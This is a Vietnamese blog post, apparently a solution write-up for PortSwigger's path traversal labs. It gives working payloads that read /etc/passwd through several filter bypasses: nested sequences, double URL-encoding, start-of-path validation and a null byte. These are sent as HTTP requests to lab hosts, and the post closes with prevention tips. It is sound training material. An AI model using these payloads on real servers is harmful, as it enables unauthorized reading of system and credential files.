---
title: "[PortSwigger Lab] - Path Traversal"
description: Solution of Path Traversal on PortSwigger Lab
date: 2025-06-01 11:00:00 +0700
categories: [Cyber ​​Security, Web Pentest]
tags: [portswigger, burpsuite, labs, web, vulnerability, path traversal, directory traversal]   
pin: false
comments: true
image:
    path: https://raw.githubusercontent.com/waibui/blog-assets/refs/heads/main/imgs/posts/2025-06-01-portswigger-lab-path-traversal/path-traversal.png
    alt: Path Traversal
---

## Introduction
--- 

**Path traversal** còn được gọi là **Directory traversal**. Các lỗ hổng này cho phép kẻ tấn công đọc các tệp tùy ý trên máy chủ đang chạy một ứng dụng. Điều này có thể bao gồm:
- Application code and data.
- Credentials for back-end systems.
- Sensitive operating system files.

Trong một số trường hợp, kẻ tấn công có thể ghi vào các tệp tùy ý trên máy chủ, cho phép chúng sửa đổi dữ liệu hoặc hành vi ứng dụng và cuối cùng kiểm soát toàn bộ máy chủ.

## Solve Path Traversal Lab
---
- **Relative path:** `../../../etc/passwd`
- **Absolute path:** `/etc/passwd`
- **View images**: Filter settings > Filter bt MINE type > enable `images`
### Lab: File path traversal, simple case
- Mở 1 image bất kỳ
```
https://0af90002046a785a82be974700ff007e.web-security-academy.net/image?filename=8.jpg
```

- Thay đổi đường dẫn của image
```
https://0af90002046a785a82be974700ff007e.web-security-academy.net/image?filename=../../../etc/passwd
```

- Điều này khiến ứng dụng đọc từ đường dẫn tệp sau
```
/var/www/images/../../../etc/passwd
```

- Trình tự `../` có giá trị trong một **file path** và có nghĩa là để tăng một cấp trong cấu trúc thư mục. Ba chuỗi liên tiếp `..`:
    - Lần 1:
    ```
    /var/www/../../etc/passwd
    ```
    - Lần 2:
    ```
    /var/../etc/passwd
    ```
    - Lần 3:
    ```
    /etc/passwd
    ```

- Cuối cùng ứng dụng hiển thị nội dung của file `/etc/passwd`
- `/etc/passwd` là một tập tin hệ thống rất quan trọng trong các hệ điều hành **Unix**và **Linux**. Nó lưu trữ thông tin về user trên hệ thống. Dù tên là `"passwd" (password)`, nhưng mật khẩu thực tế không còn được lưu ở đây nữa mà được lưu trong tệp `/etc/shadow` với quyền truy cập hạn chế hơn.
- Truy cập **HTTP history** để xem nội dung

### File path traversal, traversal sequences blocked with absolute path bypass
- `../` đã bị block, cần bypass thông qua **absolute path**
- Mở 1 file ảnh bất kỳ trong tab mới
```
https://0a35004b0379e87d805eb796009c003b.web-security-academy.net/image?filename=33.jpg
```
- Thay đổi tên ảnh bằng **absolute path**: `/etc/passwd`
```
https://0a35004b0379e87d805eb796009c003b.web-security-academy.net/image?filename=/etc/passwd
```
- Truy cập **HTTP history** để xem nội dung

### File path traversal, traversal sequences stripped non-recursively
#### Analysis
Ở lab này, chương trình sẽ loại bỏ các **traversal sequences**, tức:
```
../../../etc/passwd
```
Sẽ trở thành
```
etc/passwd
```
Chương trình sẽ xóa tất cả `../` ra khỏi chuỗi

#### Exploit
Ý tưởng: vẫn để chương trình loại bỏ `../`, nhưng vẫn giữ được đường dẫn tương đối đến `/etc/passwd`
- Payload 1: ..././..././..././etc/passwd
- Payload 2: ....//....//....//etc/passwd
- Payload 3: ....\/....\/....\/etc/passwd

Sau khi chương trình đã loại bỏ `../` hoặc `..\` thì mọi thứ đểù trở thành `../../../etc/passwd`
> **Windows** sử dụng cả `../` và `..\`
{: .prompt-info}

- Thay đổi đường dẫn hình ảnh sử dụng các payload trên.
- Truy cập **HTTP history** để xem nội dung

### Lab: File path traversal, traversal sequences stripped with superfluous URL-decode
#### Analysis
- Để giải quyết lab này, cần phải **encode url** 2 lần
- Mốt số trường hợp webserver decode 1 lần và kiểm tra `../` có tồn tại không để thực hiện logic khác
- Sau khi decode 1 lần, request được gửi đến **Backend** để xử lý, và **Path traversal** xảy ra
#### Exploit
- Gửi request đến **Repeater**, thay đổi đường dẫn
```http
GET /image?filename=../../../etc/passwd HTTP/2
Host: 0a24006d03b4e0b48025dad200d800f9.web-security-academy.net
```

- Bôi đen `../../../`, tại tab **Inspector**, phần **Decoded from** chon ký hiệu `+`
- Ở phần **Decoded from** vửa được tạo, click **select**, chọn **URL encoding**
- Tại đó, nhập lại `../../../`
- Copy nội dung phần **Selected text** và dán vào request
```http
GET /image?filename=..%252f..%252f..%252fetc/passwd HTTP/2
Host: 0a24006d03b4e0b48025dad200d800f9.web-security-academy.net
```

### Lab: File path traversal, validation of start of path
- Mở 1 file ảnh tùy ý ở tab khác và gửi nó đến **Repeater**
- Ta thấy nó chỉ định bắt đầu từ `/var/www/image/filepath`
```http
GET /image?filename=/var/www/images/38.jpg HTTP/2
Host: 0a3c0092041de0d6800dc688002700bb.web-security-academy.net
```
- Thêm **traversal sequence** để chuyển hướng đến **root** rồi trở về **/etc/passwd**
- Thay đổi request để đọc file `/etc/passwd`
```http
GET /image?filename=/var/www/images/../../../etc/passwd HTTP/2
Host: 0a3c0092041de0d6800dc688002700bb.web-security-academy.net
```

### Lab: File path traversal, validation of file extension with null byte bypass
#### Analysis
Trên một số hệ thống cũ hoặc ngôn ngữ xử lý C-style:
Khi chuỗi `../../../etc/passwd%00.png` được truyền vào hàm như `fopen()`:
```c
fopen("../../../etc/passwd\0.png", "r");
```
→ Hệ thống dừng đọc chuỗi tại null byte (\0). Tức là chỉ mở file: `../../../etc/passwd`, phần `.png` sau `%00` không còn ảnh hưởng.
#### Exploit
Tương tự như các lab trên nhưng gửi với request có `null byte (%00)`
```http
GET /image?filename=../../../etc/passwd%00.png HTTP/2
Host: 0a9d00870462f85880c9b2e400c6002c.web-security-academy.net
```

- Một số hệ thống sẽ filter dựa trên `extension`, trường hợp này là `.png`
- Nên sử dụng `null byte` để tách bỏ `extension` ra, đọc file `/etc/passwd`


## Prevent
--- 
- Tránh hoàn toàn việc sử dụng đầu vào từ người dùng trong các API thao tác với hệ thống file.
- Nếu buộc phải dùng đầu vào từ người dùng thì sao?
    - Validate đầu vào
    - Chuẩn hóa và kiểm tra đường dẫn tuyệt đối **(canonical path)**

---
Goodluck! 🍀🍀🍀
